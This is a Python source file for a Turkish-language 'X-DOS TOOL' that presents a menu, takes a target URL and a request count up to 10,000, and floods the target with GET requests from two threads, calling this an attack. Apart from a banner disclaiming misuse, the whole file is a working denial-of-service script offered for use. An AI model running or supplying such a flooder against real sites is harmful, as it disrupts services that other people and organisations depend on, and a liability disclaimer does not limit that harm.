from colorama import Fore, Style, init # Sonradan kullanılacak
init(autoreset=True)
import threading
import requests
import os
import time
import sys

def print_banner():
	banner = r"""
__  __     ____   ___  ____    _____ ___   ___  _     
\ \/ /    |  _ \ / _ \/ ___|  |_   _/ _ \ / _ \| |    
 \  /_____| | | | | | \___ \    | || | | | | | | |    
 /  \_____| |_| | |_| |___) |   | || |_| | |_| | |___ 
/_/\_\    |____/ \___/|____/    |_| \___/ \___/|_____| 
			  """                                                    
                                                                                              
	print(banner)
	print("------------------------------------------------------")
	print("Bu uygulama farkındalık ve güvenlik testleri için geliştirilmiştir.")
	print("Bu hacking aracının kötüye kullanılmasından biz sorumlu değiliz !!!!")
	print("Yapımcı: YAYTech")
	print("GitHub: https://github.com/YAYTech")
	print("Sürüm: 1.0.0")
	print("Lisans: MIT")
	print("Tarih: 2024-12-26")
	print("\n")
	time.sleep(2)

	input("[*] Enter tuşuna tıklayın...")


def print_menu():
	print_banner()
	print("******************************************************")
	print("*                      Ana Menu                      *")
	print("******************************************************")
	print("*          1. Saldırı Yap                            *")
	print("*                                                    *")
	print("*          2. Tool Versiyonununu Kontrol Et          *")
	print("*                                                    *")
	print("*          3. Çıkış                                  *")
	print("******************************************************")
	secenek = input(">> Bir seçenek girin (1-3): ")

	if secenek == "1":
		time.sleep(1)
		saldiri_yap()

	if secenek == "2":
		print("[*] Versyon kontrolü yapılıyor...")
		time.sleep(1)
		versiyon_kontrolu()

	if secenek == "3":
		print("[*] Çıkış yapılıyor ...")
		time.sleep(1)
		sys.exit()

def saldiri_yap():
	print("[*] Çıkmak için 'exit' komutunu giriniz.")
	hedef = input(">> Hedef IP adresini veya domaini giriniz (Domain önerilir): ")
	if hedef == "exit":
		time.sleep(1)
		sys.exit()
	print("[*] Hedef denetleniyor...")
	time.sleep(1)
	try:
		response = requests.get(hedef, timeout=10)
		if response:
			if response.status_code == 200:
				print("[*] Hedef IP veya Domain adresi geçerli.")
	except Exception as e:
		print(Fore.RED + "[-] Hedefe istek gönderilirken bir sorun yaşandı:")
		print(e)
		print("[*] İnternet bağlantınızı kontrol edin veya hedefinizin başına 'https://' veya 'http://' yerleştiriniz.")
		sys.exit()

	sayi = int(input(">> Gönderilecek istek sayısını giriniz (0-10000): "))

	if sayi < 0 or sayi > 10000:
		print(Fore.RED + "[-] Gönderilecek istek sayısı 10000'i aşmamalıdır !!!")
		sys.exit()

	input("[*] Saldırıyı başlatmak istediğinizden eminmisiniz, eğer eminseniz Enter tuşuna basınız...")

	print("[+] Saldırı başlıyor ...\n")
	time.sleep(1)

	thread1 = threading.Thread(target=istek_at, args=(hedef, sayi))
	thread2 = threading.Thread(target=istek_at, args=(hedef, sayi))
	thread1.start()
	thread2.start()

def root_kontrolu_yap():
	if os.geteuid() == 0:
		print_menu()
	else:
		print(Fore.RED + "[-] Uygulama root olarak çalışmıyor, lütfen root kullanıcısına geçip yeniden deneyin.")
		
def istek_at(hedef, sayi):
	sayi = sayi / 2
	x = 0
	while True:
		x += 1
		try:
			response = requests.get(hedef, timeout=5)
			if response.status_code == 200:
				print(f"-----GET isteği gönderildi Code: {response.status_code}-----")
			else:
				print(Fore.RED + f"-----GET isteği gönderirken sorun yaşandı Code: {response.status_code}-----")
		except:
			pass
		if x > sayi:
			print("[+] Saldırı başarılı bir şekilde bitti.")
			break

def versiyon_kontrolu():
	with open("version.txt","r") as file:
		versiyon = file.readline()
		print(f"[*] Versiyon: {versiyon}")

root_kontrolu_yap()